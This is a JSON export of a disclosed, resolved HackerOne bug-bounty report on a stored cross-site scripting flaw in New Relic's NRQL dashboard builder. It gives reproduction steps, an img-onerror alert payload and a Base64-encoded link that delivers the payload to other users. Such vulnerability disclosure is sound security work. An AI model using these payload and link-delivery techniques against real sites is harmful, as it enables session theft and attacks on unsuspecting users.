{
  "id": 626082,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYwODI=",
  "url": "https://hackerone.com/reports/626082",
  "title": "Stored XSS via \"my recent queries\" selector in NRQL dashboard builder",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-06-22T22:59:28.333Z",
  "submitted_at": "2019-06-22T22:59:28.333Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jon_bottarini",
    "url": "/jon_bottarini",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 17011,
    "url": "https://hackerone.com/newrelic",
    "handle": "newrelic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "New Relic",
      "twitter_handle": "newrelic",
      "website": "https://newrelic.com",
      "about": "New Relic's Coordinated Disclosure Program"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-08-24T14:58:15.517Z",
  "bug_reporter_agreed_on_going_public_at": "2020-08-20T02:38:04.095Z",
  "team_member_agreed_on_going_public_at": "2020-08-24T14:58:15.380Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "This is a pretty simple one. \n\nWithin NR One, there is a stored XSS via the dashboard builder. It appears in the \"My recent queries\" dropdown. You can attack other users with this bug by having them navigate to the link, I'll show an example below. \n\nSteps to Reproduce:\n1. From NR1, navigate to the chart builder\n2. Switch to NRQL mode\n3. Enter the following NRQL query in the search box: \n\n```SELECT `“><img src=x onerror=alert(document.domain)> \"' Style=position` FROM SyntheticCheck```\n\n4. Press enter. \n5. Now, click on the \"My recent queries\" dropdown button. \n6. Payload will fire\n\n{F514924}\n\n## Impact\n\nIf you want to attack other users with this, you just need to send them the link to the payload in the address bar: \n\nhttps://one.newrelic.com/launcher/nr1-core.home#pane=eyJuZXJkbGV0SWQiOiJucjEtY29yZS5zZWFyY2gtcm9vdCJ9&overlay=eyJvdmVybGF5SWQiOiJ3YW5kYS1kYXRhLWV4cGxvcmF0aW9uLm5ycWwtZWRpdG9yIiwibmVyZGxldElkIjoid2FuZGEtZGF0YS1leHBsb3JhdGlvbi5kYXRhLWV4cGxvcmVyIiwiaW5pdGlhbEFjdGl2ZUludGVyZmFjZSI6Im5ycWxFZGl0b3IiLCJpbml0aWFsTGltaXQiOjEwLCJpbml0aWFsVGltZVdpbmRvdyI6eyJzdGFydCI6bnVsbCwiZW5kIjoibm93Iiwib2Zmc2V0IjoxODAwMDAwfSwiaW5pdGlhbFRpbWVXaW5kb3dPdmVycmlkZSI6bnVsbCwiaW5pdGlhbEZpbHRlcnMiOiIiLCJpbml0aWFsUGxvdEFnZ3JlZ2F0ZSI6eyJwbG90Ijp7ImV2ZW50VHlwZXMiOlsiVHJhbnNhY3Rpb24iXSwiY2xhdXNlcyI6W3siYWxpYXMiOiJSZXNwb25zZSB0aW1lIiwibnJxbCI6IigodG90YWxUaW1lIE9SIGR1cmF0aW9uIE9SIDApICsgKHF1ZXVlRHVyYXRpb24gT1IgMCkgT1IgMCkgKiAxMDAwIn0seyJhbGlhcyI6IlJlcXVlc3QgcXVldWluZyIsIm5ycWwiOiIocXVldWVEdXJhdGlvbiBPUiAwKSAqIDEwMDAifSx7ImFsaWFzIjoiRXh0ZXJuYWxzIiwibnJxbCI6IihleHRlcm5hbER1cmF0aW9uIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJHQyIsIm5ycWwiOiIoZ2NDdW11bGF0aXZlIE9SIDApICogMTAwMCJ9LHsiYWxpYXMiOiJBcHBsaWNhdGlvbiB0aW1lIiwibnJxbCI6IigoKHRvdGFsVGltZSBPUiBkdXJhdGlvbiBPUiAwKSAtIChleHRlcm5hbER1cmF0aW9uIE9SIDApIC0gKGRhdGFiYXNlRHVyYXRpb24gT1IgMCkgLSAoZ2NDdW11bGF0aXZlIE9SIDApKSBPUiAwKSAqIDEwMDAifV0sInR5cGUiOiJzaG9ydGN1dCIsImxhYmVsIjoiVHJhbnNhY3Rpb24gdGltZSBicmVha2Rvd24iLCJzaG9ydGN1dE5hbWUiOiJhcG0udHJhbnNhY3Rpb25fdGltZV9icmVha2Rvd24ifSwiYWdncmVnYXRlIjoiYXZlcmFnZSJ9LCJpbml0aWFsQWNjb3VudElkIjoxNTIzOTM2LCJpbml0aWFsRmFjZXQiOm51bGwsImluaXRpYWxDb21wYXJlV2l0aCI6bnVsbCwiaW5pdGlhbENoYXJ0U2V0dGluZ3MiOnsiY2hhcnRUeXBlIjoiQ0hBUlRfVEFCTEUifSwiaW5pdGlhbE5ycWxWYWx1ZSI6IlNFTEVDVCBg4oCcPjxpbWcgc3JjPXggb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPiBcIicgU3R5bGU9cG9zaXRpb25gIEZST00gU3ludGhldGljQ2hlY2sifQ==\n\nThe reason this works is that `overlay=` parameter is Base64 encoded:\n\n```{\"overlayId\":\"wanda-data-exploration.nrql-editor\",\"nerdletId\":\"wanda-data-exploration.data-explorer\",\"initialActiveInterface\":\"nrqlEditor\",\"initialLimit\":10,\"initialTimeWindow\":{\"start\":null,\"end\":\"now\",\"offset\":1800000},\"initialTimeWindowOverride\":null,\"initialFilters\":\"\",\"initialPlotAggregate\":{\"plot\":{\"eventTypes\":[\"Transaction\"],\"clauses\":[{\"alias\":\"Response time\",\"nrql\":\"((totalTime OR duration OR 0) + (queueDuration OR 0) OR 0) * 1000\"},{\"alias\":\"Request queuing\",\"nrql\":\"(queueDuration OR 0) * 1000\"},{\"alias\":\"Externals\",\"nrql\":\"(externalDuration OR 0) * 1000\"},{\"alias\":\"GC\",\"nrql\":\"(gcCumulative OR 0) * 1000\"},{\"alias\":\"Application time\",\"nrql\":\"(((totalTime OR duration OR 0) - (externalDuration OR 0) - (databaseDuration OR 0) - (gcCumulative OR 0)) OR 0) * 1000\"}],\"type\":\"shortcut\",\"label\":\"Transaction time breakdown\",\"shortcutName\":\"apm.transaction_time_breakdown\"},\"aggregate\":\"average\"},\"initialAccountId\":1523936,\"initialFacet\":null,\"initialCompareWith\":null,\"initialChartSettings\":{\"chartType\":\"CHART_TABLE\"},\"initialNrqlValue\":\"SELECT `â><img src=x onerror=alert(document.domain)> \\\"' Style=position` FROM SyntheticCheck\"}```\n\nWhich includes the payload in the request.",
  "bounty_amount": "2500.0",
  "formatted_bounty": "$2,500",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 514924,
      "file_name": "Screen_Shot_2019-06-22_at_3.51.12_PM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/514/924/8faffe21fcb96d321ec06d9130e6094e5076ac19/Screen_Shot_2019-06-22_at_3.51.12_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-22_at_3.51.12_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-22_at_3.51.12_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ564LXW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132412Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDl76KVUFS0hN8YruFStxJXVErBlHnUq37TLzE6NJ4nVgIhANpbiTp%2BMBG4Nwb5E7dtwmMEX5oh%2FQf%2BDE1tYHw3IkRRKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5IgysR5bYjXDNHPUxaW8qjwUn5sVCnmMuonjKnG%2FT4J4WQrTsBQX1SNmTEPNbtsQv5XcKQaoPHieXQdr%2B%2B1X5avNpXfOZbh0pZ6CXdrJ4yYa55f0HXkeQiH0zcQ0fif5j1pP8jC%2Blsq%2BD9fB7SzZQg6RmosBSYA4XGzLy8%2FPyGRLQ28yjB4W8KTl8fBM4CmJJFWLBmzWUBK2SOnDwMfsDL5%2BmafcYaKkz0yszM1cg3XozTAFLh8hmoIUAWpu77QkIzg0Ht8%2B93fM%2FYsZn5uKr6IpQ2U4pqWdLfB29cuQ%2Fcqg62XxGu%2BLk6jR1jXWEegWhMonWqQeGJPWbh8kEDYxBzUAidK12bSQGyMxonksvquoUumwsvEUzmQd%2BhHIBPGEfHEpImOlgzqswJwZ%2F4JNoWjfIUk3c2lvDijlThqGBqTQoB645h%2B4iprdRTJwkrRB74qIwzHH8cv8viZ7ZrieVZK6heyAtoEGA%2BZN6Yt1%2Fh3uEHlmtJnS1Vmef8OPs7HDSzKz4njXcD7iXOt625xzMEBsfshpisEQDc6V%2BgE%2BBXbdv%2FT4XaJkVUN7kUFRWxoez0R%2FafT55iChRzC%2FCCCtXPxRwQLswXHFkjSKPv6sVfuM5MRTBUP55DDIHcRMXtwEjecS03yT%2BLa3gpqGgU9vRMfcH0LWQdYklhl1sQ6N1w3UJ%2BzTVF7HEgKCpghOKhwVCK9huxD72fxZOO6FF5FJzK3DifWVeM1v32dnnKItdegNY3N8My9s4MQJ%2B3ECyboRUjyg2nm%2BDhuYrpgIelJVrUGgu74IzyiQ2A%2FCKjoDOYFSWGrm4y%2B2UnhJeZRlQds%2FlnTD4xuiMof7htaNeiZuyDqfi6JTbOSG%2FNqB7QSE2ezcJ75qQGAqDpKeqbVdeTC34MIa2ra4GOrABDubMC6LwabfeW3Qsfz2RgL7fTEyxJw929PcIhksJK3EmRE2rUVVoVGGm7fTwmneEB55wcJn7xtg4Rs3f5YiKxBbRlxeqJEXHdJJWWaOq%2BpG%2BMHzVFgbZYimMKoU39IYu2PyQrofnOmHZ%2FEB3I1PLguFv1fjZlzVTHUwnD4kRx2g5tTJLggeCKerD5uXmMSsk8WllCOp%2FdA8M69%2BsXGmqNNPZRG6tkFF%2FJPssbKNyXTU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1ef5de0f87dcf80c7c979edbe6d36573d6e84541d23a891d4f2e7a1f8afe6636",
      "file_size": 1018321,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-09-19T02:38:04.148Z",
  "allow_singular_disclosure_after": -107347567.94431527,
  "singular_disclosure_allowed": true,
  "vote_count": 15,
  "voters": [
    "wi11",
    "base_64",
    "ali",
    "mattberg",
    "rdzxytfcv",
    "b780b984070b4485faf5765",
    "perun",
    "x1x0",
    "jackxparrow",
    "rizkylabh1",
    "and 5 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 31873,
    "asset_type": "URL",
    "asset_identifier": "one.newrelic.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
